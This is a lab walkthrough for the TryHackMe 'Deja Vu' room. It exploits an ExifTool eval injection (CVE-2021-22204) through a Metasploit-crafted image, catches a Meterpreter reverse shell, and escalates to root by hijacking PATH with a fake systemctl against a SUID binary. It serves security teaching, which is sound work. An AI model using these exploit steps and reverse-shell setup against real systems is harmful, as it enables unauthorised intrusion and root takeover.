# Deja Vu

**Room Link:** [https://tryhackme.com/r/room/dejavu](https://tryhackme.com/r/room/dejavu)



## Dog Pictures - Exploring a webapp

After our initial port scan, we find two open ports. As usual, SSH is not much use without credentials as it's up to date. This just leaves us with a web application to explore.

From Nmap's service version detection, we know that the backend is built in Golang. This hopefully means dynamic content that we can explore.

The first step in exploiting a webapp, like exploiting anything else, is reconnaissance. Exploring the webapp to discover functionality is critical for gaining a basic familiarity with the webapp and potentially how it works. Navigating the webapp without actively trying to exploit the functionality is called walking the happy path. You can learn more about this technique (and a lot more) in this room: [Walking An Application](https://tryhackme.com/room/walkinganapplication).

Open up Burp Suite with your browser of choice (I like the integrated Chromium) and we can start exploring the site.



### Answer the questions

Setup Burp to track the site

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Click around the website. Can you find any developer comments?**

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Can you find the page that gives more details about a dog photo?**



**Perform an Nmap scan of the target. What version of SSH is in use?**

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1193).png" alt=""><figcaption></figcaption></figure>



## Vulnerability Discovery

After we've gained a basic familiarity with the site, we can start some more active enumeration. A directory brute force scan can help us discover content that's otherwise unreachable through normal browsing, like admin pages or old versions that haven't been removed. With admin pages leading to more application features that might not be hardened, or unmaintained code from outdated versions, we're more likely to find vulnerabilities.

Run a gobuster scan with dirb's `big.txt` wordlist. What can you find? Other tools and wordlists are available.

With an API driven webapp like this, we can see how the application retrieves data to make it dynamic. A great way to do this is Burp Suite, which can automatically map out the target site's structure as we explore.

## Discovering the overly verbose API

Burp Suite's target site map should have discovered 2 API routes that the website uses to retrieve information about the dog pictures. One retrieves the title and caption, and the other is used to retrieve the date and author. The full paths have been redacted, so that you find them yourself.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d96207dd832c106398e2267/room-content/03100fff977a5fb2c6c2c4cc3b82a241.png)\


It appears the API route used to retrieve the date and author does so with EXIF data, and uses Exiftool from the response. It appears the output of the command is simply serialised into JSON and sent to the client. This gives us a lot of information, notably the ExifTool version number. This is considered a vulnerability under the[ OWASP API Top 10](https://owasp.org/www-project-api-security/), more specifically `API3:2019 Excessive Data Exposure`. Usually, exposing version numbers would be considered a low or informational rated issue but as we will discover it can have more serious consequences.

### Answer the questions

**What page can be used to upload your own dog picture?**

/upload/

**What API route is used to provide the Title and Caption for a specific dog image?**

/dog/getmetadata

**What API route does the application use to retrieve further information about the dog picture?**

/dog/getexifdata

**What attribute in the JSON response from this endpoint specifies the version of ExifTool being used by the webapp?**

ExifToolVersion

<figure><img src="../../.gitbook/assets/image (1194).png" alt=""><figcaption></figcaption></figure>



**What version of ExifTool is in use?**

12.23

**What RCE exploit is present in this version of ExifTool? Give the CVE number in format CVE-XXXX-XXXXX**

CVE-2021-22204

## Exploitation

Now that we've discovered a potential method of exploiting the box, we should try it!

Turning our version disclosure into remote code execution massively increases the severity of the issue.

### Why is this exploit interesting?

In the Microsoft ecosystem, there's a concept called "Patch Tuesday"; security patches for Microsoft products are often released on Tuesdays.\
Practically immediately after these patches are released, work begins on creating exploits for the vulnerabilities as many systems will not be immediately updated.

Exiftool follows a similar story here. In early 2021, an exploit was discovered in Exiftool that could lead to arbitrary code execution. The exploit was quickly patched before public proof of concept code started to appear, however many security enthusiasts began to reverse engineer the patch to create an exploit.

### Looking for the patch

Researching the vulnerability, we can see it was assigned CVE-2021-22204. Looking at the [NVD CVE page](https://nvd.nist.gov/vuln/detail/CVE-2021-22204) for the flaw shows that it was patched in 12.24. The page also has a link to the patch, which is very useful here because we can see how they fixed the vulnerability. The git diff is copied below.

```perl
-	230	# must protect unescaped "$" and "@" symbols, and "\" at end of string
-	231	$tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
-	232	# convert C escape sequences (allowed in quoted text)
-	233	$tok = eval qq{"$tok"};
+	230	# convert C escape sequences, allowed in quoted text
+	231	# (note: this only converts a few of them!)
+	232	my %esc = ( a => "\a", b => "\b", f => "\f", n => "\n",
+	233	r => "\r", t => "\t", '"' => '"', '\\' => '\\' );
+	234	$tok =~ s/\\(.)/$esc{$1}||'\\'.$1/egs;
```

### Understanding the code, and the danger

The dangerous function here is the call to eval on line 233. Eval is used to run Perl code that's contained in a variable, and the variable comes from EXIF data in our image. Control over code that's executed is our goal, so it currently seems like the only barrier between us and arbitrary code execution is the filter found on line 231.

```perl
# must protect unescaped "$" and "@" symbols, and "\" at end of string
$tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
```

It's worth explaining the `=~` that's used here. It's a Perl operator usually used with regular expressions, and it can be very very complicated. Importantly for us, the first character after the \~ is 's'. This means that the operator will perform a search and replace with the regular expression that follows.

That regular expression is also very complicated, unfortunately. There's a helpful comment explaining the intent, escaping special characters in the string. Another unfortunate discovery, if we look at the source code surrounding our filter which wasn't captured in the diff, is that this filter also relies on quote marks delimiting the ends of fields.

Combining all this information, we can see how a code injection vulnerability would arise if we can bypass the filter and have Perl `eval` our own code. As this filter is irritating and the exploit is somewhat complex to engineer, we'll simply use Metasploit to craft our exploit. Articles describing how an exploit was created manually are included later.

### Creating our exploit with Metasploit

To create our exploit, we need to first find the Metasploit module for this vulnerability. If you're unfamiliar with locating exploits in Metasploit, try the [TryHackMe Metasploit Intro](https://tryhackme.com/room/metasploitintro) room.\


We then need to set our options appropriately for a reverse shell payload. As it's a Perl command injection vulnerability, we want a command payload rather than a binary payload. Make sure your LHOST is correct and make sure you start a netcat listener!



**More information**

If you didn't like my explanations, want to learn more, or you want to see how the proof of concepts were created, please see the links below.

* [https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)
* [https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool](https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool)
* [https://www.openwall.com/lists/oss-security/2021/05/10/5](https://www.openwall.com/lists/oss-security/2021/05/10/5)

### Answer the questions

**Generate an image payload with Metasploit**

**Kali**

```
msfconsole
```

**Kali(msfconsole)**

```
search exiftool
use 0
set lhost ens5
set lport 4444
run
```

**Kali**

```
cp /root/.msf4/local/msf.jpg /root/
```

**Get code execution on the target machine**

**Kali**

```
use exploit/multi/handler
set payload cmd/unix/python/meterpreter/reverse_tcp
set lhost ens5
set lport 4444
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - Enumeration and PATH Exploitation

### Privesc Enumeration

Now that we have code execution, our goal should be rooting the box. Fortunately, something should immediately catch your attention if you run ls -lah from the current working directory. A SUID binary! The presence of one of these in a home directory is quite unusual, but it looks like we have a file left by the server administrator to help manage the webserver. It also looks like we have the source code for this C program, very useful for exploiting it.

### A note on SELinux

SELinux improves security by essentially setting out rules that processes are made to follow.\
While SELinux can make hacking a box more difficult, it can also make administering a server more difficult.

Rather than trying to configure SELinux to allow the webserver to bind to port 80, the system administrator just disabled it. This is a somewhat common approach, but is by no means the "correct" approach which would be learning the fundamentals of SELinux and configuring it correctly. With the command `getenforce` we can verify whether SELinux is enforcing its rules (the command prints disabled).

While SELinux doesn't affect the privesc we use here, it is worth bearing in mind in real pentests or harder rooms.

You can read more about SELinux at these links:

[https://selinuxproject.org/page/FAQ](https://selinuxproject.org/page/FAQ)\
[https://www.redhat.com/en/topics/linux/what-is-selinux](https://www.redhat.com/en/topics/linux/what-is-selinux)

### Understanding SUID binaries

A SUID binary has special permissions, allowing the program to use the `setuid` system call. The `setuid` call allows the process to set its user id. If you call `setuid(0)` and the process has the correct permissions, then the program will then run as root.

When a program may need to run parts of the code as root but does not want to run the whole program as root, SUID is often used. An example of this would be the webserver Apache2, which initially runs as root to bind to port 80 and then subsequently drops these elevated privileges.

SUID binaries can only set their UID to the owner of the binary's UID unless the binary is owned by root, in which case they can set it to any UID. You usually don't have to call `setuid` yourself, the program will _usually_ do this.

A more modern alternative to setuid binaries is Linux Capabilities, which offer much more granular control over permissions such as `CAP_NET_BIND_SERVICE` which allows programs to bind to low (privileged, under 1024) ports without running as root. The capability `CAP_SET_UID` is equivalent to  suid permissions, allowing the program to call `setuid`

### What does the vulnerable binary do?

If we run the binary, with `./serverManager`, we get a choice of operations.

Selecting 0 gives us the status of the webserver service, and 1 allows us to restart it. Restarting the service would usually require root privileges, so it makes some sense that the binary is SUID.

**Reverse Shell**

```shell-session
[dogpics@dejavu ~]$ ./serverManager 
Welcome to the DogPics server manager Version 1.0
Please enter a choice:
0 -	Get server status
1 -	Restart server
0
● dogpics.service - Dog pictures
   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)
   Active: active (running) since Sat 2021-09-11 18:00:08 BST; 19min ago
 Main PID: 776 (webserver)
    Tasks: 7 (limit: 5971)
   Memory: 76.8M
   CGroup: /system.slice/dogpics.service
           └─776 /home/dogpics/webserver -p 80

Sep 11 18:00:08 dejavu systemd[1]: Started Dog pictures.
```

As we have the source code of the application, we can more easily see the vulnerability.

**serverManager.c - vi**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{   
    setuid(0);
    setgid(0);
    printf(
        "Welcome to the DogPics server manager Version 1.0\n"
        "Please enter a choice:\n");
    int operation = 0;
    printf(
        "0 -\tGet server status\n"
        "1 -\tRestart server\n");
    while (operation < 48 || operation > 49) {
        operation = getchar();
        getchar();
        if (operation < 48 || operation > 49) {
            printf("Invalid choice.\n");
        }
    }
    operation = operation - 48;
    //printf("Choice was:\t%d\n",operation);
    switch (operation)
    {
    case 0:
        //printf("0\n");
        system("systemctl status --no-pager dogpics");
        break;
    case 1:
        system("sudo systemctl restart dogpics");
        break;
    default:
        break;
    }
}
```

The vulnerability comes from calling system() without providing a full path to the binary. This means that we can create a fake systemctl binary which will run as root, and escalate our privileges.

We can also use a program called ltrace which allows us to see system and library calls, although this is not installed on the machine. Pay close attention to the system() seen earlier that provides systemctl without its full path.&#x20;

**james@centos**

```shell-session
[james@centos]$ ltrace -b -a 100 ./serverManager
setuid(0)                                                                                          = -1
setgid(0)                                                                                          = -1
puts("Welcome to the DogPics server ma"...Welcome to the DogPics server manager Version 1.0
Please enter a choice:
)                                                        = 73
puts("0 -\tGet server status\n1 -\tRestar"...0 -        Get server status
1 -     Restart server
)                                                     = 41
getchar(0, 0x25d62a0, 0x7f8d48b99860, 0x7f8d488c56480
)                                              = 48
getchar(0, 0x25d66b0, 0x25d66b1, 0x7f8d488c55a5)                                                   = 10
system("systemctl status --no-pager dogp"...● dogpics.service - Dog pictures
   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)
   Active: active (running) since Sat 2021-09-11 18:28:17 BST; 6min ago
 Main PID: 894 (webserver)
    Tasks: 6 (limit: 24819)
   Memory: 17.9M
   CGroup: /system.slice/dogpics.service
           └─894 /home/dogpics/webserver -p 80
)                                                      = 0
```

### Explaining the PATH variable

The PATH variable tells the shell where to look for binaries that you call by name, so for example ls is actually /bin/ls. It consists of a sequence of directories, separated by colons. Your shell will run the first binary that matches, looking in each directory left to right. This direction is important.\


### What are we exploiting?

We're exploiting a combination of two things here.

Firstly, the binary runs as root due to SUID.

Secondly, the binary calls `systemctl` with an incomplete path (eg not `/usr/bin/systemctl`, just `systemctl` on it's own.)

Because the system will run the first binary it finds from PATH that matches systemctl here, we can make our own fake `systemctl` to run instead, which will be ran as root (as it inherits the UID and GID of the parent process).

Our fake `systemctl` can be as simple as `/bin/bash` in plaintext to start a new shell - Linux treats executable text files as shell scripts.

Let's create a fake `systemctl`, add it to path, and get root.

**Reverse Shell**

```shell-session
[dogpics@dejavu ~]$ which systemctl
/usr/bin/systemctl
[dogpics@dejavu ~]$ echo '/bin/bash' > systemctl
[dogpics@dejavu ~]$ chmod +x systemctl
[dogpics@dejavu ~]$ export PATH=.:$PATH
[dogpics@dejavu ~]$ which systemctl
./systemctl
[dogpics@dejavu ~]$ ./serverManager 
Welcome to the DogPics server manager Version 1.0
Please enter a choice:
0 -	Get server status
1 -	Restart server
0
[root@dejavu ~]# whoami
root
```

Let's break this down:

`[dogpics@dejavu ~]$ echo '/bin/bash' > systemctl` - We're creating a plaintext file with the contents `/bin/bash` which will start a shell when executed.

`[dogpics@dejavu ~]$ chmod +x systemctl` - We need to make our fake `systemctl` executable, otherwise it will be ignored.

`[dogpics@dejavu ~]$ export PATH=.:$PATH` - here, we add `.` (our current working directory) to the beginning of PATH. This means the system will look in our current working directory for binaries before searching the rest of PATH, and find our fake `systemctl` before the genuine one.

`[dogpics@dejavu ~]$ which systemctl` - To check that our fake `systemctl` will run if the command `systemctl` is used, we use `which`. `which` essentially does the PATH lookup for us and prints the results.

`[dogpics@dejavu ~]$ ./serverManager` - Run the vulnerable binary!

From there, you should have a root shell. As a warning, your HOME variable is still `/home/dogpics` rather than `/root` so you will need to `cd /root`. Then just grab the flag.

### Further reading on this method

[https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

